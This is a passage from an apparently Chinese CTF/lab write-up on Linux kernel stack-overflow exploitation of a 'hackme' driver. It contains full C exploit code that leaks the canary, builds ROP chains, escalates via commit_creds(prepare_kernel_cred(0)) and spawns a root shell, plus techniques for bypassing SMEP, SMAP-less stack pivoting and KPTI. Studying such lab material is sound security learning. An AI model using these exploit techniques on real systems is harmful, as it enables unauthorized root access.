<p>其中<code>fops</code>是一个自定义的设备行为指针表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.rodata:<span class="number">0000000000000320</span> hackme_fops     file_operations &lt;offset __this_module, <span class="number">0</span>, offset hackme_read, \</span><br><span class="line">.rodata:<span class="number">0000000000000320</span>                                         ; DATA XREF: .data:hackme_misc↓o</span><br><span class="line">.rodata:<span class="number">0000000000000320</span>                                  offset hackme_write, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, \</span><br><span class="line">.rodata:<span class="number">0000000000000320</span>                                  offset hackme_open, <span class="number">0</span>, offset hackme_release, <span class="number">0</span>, <span class="number">0</span>, \</span><br><span class="line">.rodata:<span class="number">0000000000000320</span>                                  <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到自定义了<code>read,write,open,release</code>四种行为</p>
<p>在<code>hackme_read</code>中发生了这么一个事:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kstack_buf1[0:size]@kernel stack  =&gt;  hackme_buf@kernel bss  =&gt;  user_data@user </span><br></pre></td></tr></table></figure>
<p>由于<code>size</code>由用户指定,因此这里可以泄露内核堆栈上的<code>canary</code>,以及函数返回地址,以此可以绕过<code>KASLR</code></p>
<p>在<code>hackme_write</code>中发生了这么一个事:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_data[0:size]@user  =&gt;  hackme_buf@kernel bss  =&gt;  kstack_buf2@kernel stack </span><br></pre></td></tr></table></figure>
<p>由于<code>size</code>由用户指定,因此这里可以往内核堆栈写入任意字节,存在堆栈溢出,可以构造<code>ROP</code>链</p>
<p>思路:</p>
<p>1.在hackme_read中泄露canary与返回地址, 绕过KASLR</p>
<p>2.在hackme_write中堆栈溢出, 构造ROP链</p>
<h2 id="exploit">exploit</h2>
<h3 id="ret2user">ret2user</h3>
<p>假设我们关闭<code>smap,smep,kpti,kaslr,</code>
只考虑绕过<code>canary</code></p>
<p>1.利用<code>hackme_read</code>泄露<code>canary</code></p>
<p>2.利用<code>hackme_write</code>绕过<code>canary</code>检查,继续溢出内核堆栈,构造<code>rop</code>链条</p>
<p>3.更换进程<code>creds</code>提权, 也就是执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br></pre></td></tr></table></figure>
<p>在用户程序中写<code>shellcode</code>实现,
然后在<code>rop</code>链条中<code>ret2shellcode</code></p>
<p>4.返回到用户态</p>
<p>也就是执行<code>iret</code></p>
<p>在用户程序中写<code>shellcode</code>实现</p>
<p>5.起<code>shell</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//未开启KASLR时,两个函数的地址</span></span><br><span class="line"><span class="type">size_t</span> addr_commit_creds = <span class="number">0xffffffff814c6410</span>;</span><br><span class="line"><span class="type">size_t</span> addr_prepare_kernel_cred = <span class="number">0xffffffff814c67f0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">size_t</span> canary;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs;</span><br><span class="line"><span class="type">size_t</span> user_ss;</span><br><span class="line"><span class="type">size_t</span> user_sp;</span><br><span class="line"><span class="type">size_t</span> user_rflags;</span><br><span class="line"><span class="type">size_t</span> user_rip;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_canary</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">overflow</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_state();   <span class="comment">//保存进入内核之前的用户态上下文</span></span><br><span class="line">    open_dev();     <span class="comment">//打开设备</span></span><br><span class="line">    leak_canary();  <span class="comment">//泄露canary</span></span><br><span class="line">    overflow();     <span class="comment">//溢出,绕过canary,构造rop链</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] should never be reached&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>&#123;</span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/hackme&quot;</span>,O_RDWR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    user_rip = spawn_shell;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Saved state&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;movabs rax,addr_prepare_kernel_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rdi,rdi;&quot;</span></span><br><span class="line">        <span class="string">&quot;call rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,rax;&quot;</span>          <span class="comment">//init_task.creds -&gt; rdi</span></span><br><span class="line">        <span class="string">&quot;movabs rax,addr_commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;call rax;&quot;</span>             <span class="comment">//commit_creds(init_task.creds)</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_rip;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_canary</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    read(dev_fd,buffer,<span class="number">0xA8</span>);</span><br><span class="line">    canary = *(<span class="type">size_t</span>*)((<span class="type">char</span>*)buffer+<span class="number">0x80</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">overflow</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = (<span class="type">size_t</span>)&amp;privilege_escalation;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] overflow &quot;</span>);</span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="bypass-smep">bypass SMEP</h3>
<p><code>smep(supervisor mode execution protection)</code>:
内核态时不允许执行用户空间代码</p>
<p><code>smep</code>类似于用户态的NX的概念,</p>
<p><code>NX</code>不允许用户在堆栈里执行</p>
<p><code>smep</code>不允许内核态执行用户代码 ,
内核态只能执行内核态的代码</p>
<p>之前在内核堆栈中构造<code>rop</code>链, 直接返回到用户代码,
会被<code>smep</code>拦住</p>
<p>绕过方式:</p>
<p>1.<code>CR4[bit20]</code>是SMEP开关, 在老版本内核上可以改成0绕过,
但是在新内核上CR4[bit20]被扎了钉子, 手动改成0会立刻被自动改回1</p>
<figure>
<img
src="C:\Users\xidian\AppData\Roaming\Typora\typora-user-images\image-20241120211400284.png"
alt="image-20241120211400284" />
<figcaption aria-hidden="true">image-20241120211400284</figcaption>
</figure>
<p>2.全用内核<code>rop</code>绕过</p>
<p>之前的exp失效的原因是, rop链上的返回地址,
是用户程序中的<code>privilege_escalation</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload[offset++] = (<span class="type">size_t</span>)&amp;privilege_escalation;</span><br></pre></td></tr></table></figure>
<p><code>smep</code>要求在进入内核之后, 只能调用内核函数</p>
<p>那么我们需要使用纯rop链代替<code>privilege_escalation</code>的功能</p>
<p>那么这个<code>rop</code>链应该这样构造:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.addr prepare_kernel_cred</span><br><span class="line">2.gadget rax-&gt;rdi</span><br><span class="line">3.addr commit_cred</span><br><span class="line">4.addr swapgs; ret</span><br><span class="line">5.iretq</span><br><span class="line">6.RIP|CS|RFLAGS|SP|SS</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">overflow</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rdi_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = addr_prepare_kernel_cred;   <span class="comment">//init_task.creds in rax</span></span><br><span class="line">    payload[offset++] = addr_xor_edi_edi_ret;</span><br><span class="line">    payload[offset++] = addr_mov_rdi_rax_ja_pop_rbp_ret;  </span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rbp = 0   </span></span><br><span class="line">    payload[offset++] = addr_commit_creds;</span><br><span class="line">    payload[offset++] = addr_swapgs_pop_rbp_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rbp = 0</span></span><br><span class="line">    payload[offset++] = addr_iret;  <span class="comment">//rbx = 0</span></span><br><span class="line">    payload[offset++] = user_rip;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] overflow &quot;</span>);</span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="stack-pivoting">stack pivoting</h4>
<p>在只开启<code>smep</code>, 不开启<code>smap</code>的情况下,
虽然控制流无法直接执行用户空间的程序</p>
<p>但是可以直接访问用户空间的数据</p>
<p>在用户空间上申请一块内存, 然后在rop链上构造堆栈迁移,
将内核堆栈搬到用户空间中,</p>
<p>堆栈迁移的好处是:</p>
<p>1.拥有更大的空间</p>
<p>2.新堆栈可执行</p>
<p>需要注意的是,
<code>mmap</code>申请的页必须对齐到<code>0x1000</code></p>
<p>用这个<code>gadget</code>, 实际上这个限制已经非常严苛了,
甚至查<code>rsp</code>的<code>gadget</code>查不到,</p>
<p>查<code>esp</code>还是查到了两条,
幸运的是这两个地址也是在内核代码段里的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># cat gadgets.ropgadget | grep <span class="string">&quot;mov rsp, 0x.*000 ;.*; ret&quot;</span></span></span><br><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># cat gadgets.ropgadget | grep <span class="string">&quot;mov esp, 0x.*000 ;.*; ret&quot;</span></span></span><br><span class="line"><span class="number">0xffffffff8196f56a</span> : mov esp, <span class="number">0x5b000000</span> ; pop r12 ; pop rbp ; ret</span><br><span class="line"><span class="number">0xffffffff81971202</span> : xchg ebx, eax ; mov esp, <span class="number">0x5b000000</span> ; pop r12 ; pop rbp ; ret</span><br></pre></td></tr></table></figure>
<p>在<code>x86_64</code>汇编中,对<code>esp</code>这种<code>32</code>为寄存器的搬运操作,
默认是无符号搬运, 也就是说</p>
<p><code>mov esp, 0x5b000000</code>只会给<code>esp</code>的低<code>32</code>位置数,
高<code>32</code>位置零</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">alloc_fake_stack</span><span class="params">()</span>&#123;</span><br><span class="line">    fake_stack = mmap((<span class="type">char</span>*)fake_stack_addr - <span class="number">0x1000</span>,<span class="number">0x2000</span>,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> offset = <span class="number">0x1000</span>/<span class="number">8</span>;</span><br><span class="line">    fake_stack[<span class="number">0</span>] = <span class="number">0xdeadbeef</span>;		<span class="comment">//实际上写东西才会真正创建这个页</span></span><br><span class="line">    </span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;</span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;</span><br><span class="line">    fake_stack[offset++] = addr_pop_rdi_ret;</span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    fake_stack[offset++] = addr_prepare_kernel_cred;   <span class="comment">//init_task.creds in rax</span></span><br><span class="line">    fake_stack[offset++] = addr_xor_edi_edi_ret;</span><br><span class="line">    fake_stack[offset++] = addr_mov_rdi_rax_ja_pop_rbp_ret;  </span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;  <span class="comment">//rbp = 0   </span></span><br><span class="line">    fake_stack[offset++] = addr_commit_creds;</span><br><span class="line">    fake_stack[offset++] = addr_swapgs_pop_rbp_ret;</span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;  <span class="comment">//rbp = 0</span></span><br><span class="line">    fake_stack[offset++] = addr_iret;  <span class="comment">//rbx = 0</span></span><br><span class="line">    fake_stack[offset++] = user_rip;</span><br><span class="line">    fake_stack[offset++] = user_cs;</span><br><span class="line">    fake_stack[offset++] = user_rflags;</span><br><span class="line">    fake_stack[offset++] = user_sp;</span><br><span class="line">    fake_stack[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] overflow &quot;</span>);</span><br><span class="line">    write(dev_fd,fake_stack,offset*<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于<code>0x5b000000</code>这空间是用户空间的, 因此在开启smap之后,
这种方法会失效</p>
<h3 id="bypass-kpti">bypass KPTI</h3>
<p><code>Kernel page-table isolation</code> , 内核页表隔离</p>
<p>开启kpti保护后, 用户态和内核态分别使用两张页表,</p>
<figure>
<img
src="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/figure/476px-Kernel_page-table_isolation.svg.png"
alt="File:Kernel page-table isolation.svg" />
<figcaption aria-hidden="true">File:Kernel page-table
isolation.svg</figcaption>
</figure>
<p>在用户态时,页表包含了全部用户空间与内核空间的很小一部分,
主要是系统调用入口</p>
<p>在内核态时,页表包含了全部用户空间与全部内核空间,
但是用户空间的内存映射部分全都被标记为<strong>不可执行</strong>(但是还是可读写的)</p>
<p>涉及到用户态与内核态的转换时, 首先要更换页表</p>
<p>如果在内核态中不更换页表,
直接<code>iret</code>返回到用户空间想起<code>shell</code>会被<code>kpti</code>发现</p>
<h4 id="signal-handler方法">signal handler方法</h4>
<p>虽然不更换页表直接返回到用户态, 会被<code>kpti</code>发现</p>
<p>但是此时内核并不会崩溃,而是报告一个用户态的<code>SIGSEGV</code>信号</p>
<blockquote>
<p>为什么是用户态的段错误信号呢?</p>
<p>因为此时已经<code>iret</code>返回到用户态了</p>
<p>但是页表使用的仍然是<code>kpti</code>内核态页表,
而从这个也表上只能看出当前用户空间代码段没有x权限</p>
<p>因此实际上类似于NX保护时尝试执行堆栈中的<code>shellcode</code>,
是一个道理</p>
<p>因此是用户态的段错误</p>
</blockquote>
<p>调试发现, 当段错误信号发生时, 已经完成了<code>cred</code>的更换,
并且已经<code>iret</code>返回到了用户态</p>
<p>在用户态刚要执行的第一条代码触发了中断,
内核给用户发送了<code>SIGSEGV</code></p>
<p>如果此前用户已经注册了信号处理函数,
<code>shell</code>作为<code>SIGSEGV</code>的处理函数,
内核会通过正常的中断处理程序返回到用户态,
内核自己正常返回时会自动切换页表, 因此经过这条路返回到用户态就正常了,
并且控制流也给到了shell函数中</p>
<p>就可以起一个<code>root shell</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    signal(SIGSEGV, spawn_shell);</span><br><span class="line">    save_state();   <span class="comment">//保存进入内核之前的用户态上下文</span></span><br><span class="line">    open_dev();     <span class="comment">//打开设备</span></span><br><span class="line">    leak_canary();  <span class="comment">//泄露canary</span></span><br><span class="line">    overflow();     <span class="comment">//溢出,绕过canary,构造rop链</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] should never be reached&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="kpti-trampoline方法">kpti trampoline方法</h4>
<p>基于这样一点考虑:</p>
<p>内核正常的系统调用如果能走某条路成功着陆用户态,那么<strong>我们也可以借道</strong></p>
<p>这个道就叫<code>kpti trampoline</code>, 这道可以
<code>更换页表, swapgs, iretq</code></p>
<blockquote>
<p>trampoline是指内核态返回到用户态的缓冲, 因此叫做蹦床</p>
</blockquote>
<p>位于内核函数<code>swapgs_restore_regs_and_return_to_usermode</code>中</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@ Linux-5.14/arch/x86/entry/entry_64.S</span></span><br><span class="line">SYM_CODE_START_LOCAL(common_interrupt_return)</span><br><span class="line">SYM_INNER_LABEL(swapgs_restore_regs_and_return_to_usermode, SYM_L_GLOBAL)</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_ENTRY</span></span><br><span class="line">	<span class="comment">/* Assert that pt_regs indicates user mode. */</span></span><br><span class="line">	testb	$<span class="number">3</span>, CS(%rsp)</span><br><span class="line">	jnz	<span class="number">1f</span></span><br><span class="line">	ud2</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	POP_REGS pop_rdi=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.</span></span><br><span class="line"><span class="comment">	 * Save old stack pointer and switch to trampoline stack.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	movq	%rsp, %rdi</span><br><span class="line">	movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp</span><br><span class="line">	UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Copy the IRET frame to the trampoline stack. */</span></span><br><span class="line">	pushq	<span class="number">6</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* SS */</span></span><br><span class="line">	pushq	<span class="number">5</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* RSP */</span></span><br><span class="line">	pushq	<span class="number">4</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* EFLAGS */</span></span><br><span class="line">	pushq	<span class="number">3</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* CS */</span></span><br><span class="line">	pushq	<span class="number">2</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* RIP */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Push user RDI on the trampoline stack. */</span></span><br><span class="line">	pushq	(%rdi)</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We are on the trampoline stack.  All regs except RDI are live.</span></span><br><span class="line"><span class="comment">	 * We can do future final exit work right here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	STACKLEAK_ERASE_NOCLOBBER</span><br><span class="line"></span><br><span class="line">	SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Restore RDI. */</span></span><br><span class="line">	popq	%rdi</span><br><span class="line">	SWAPGS</span><br><span class="line">	INTERRUPT_RETURN</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>标号1这部分是正文</p>
<p>在这部分中,首先<code>POP_REGS pop_rdi=0</code>这是个宏,
它会从栈上弹出一系列值交给寄存器</p>
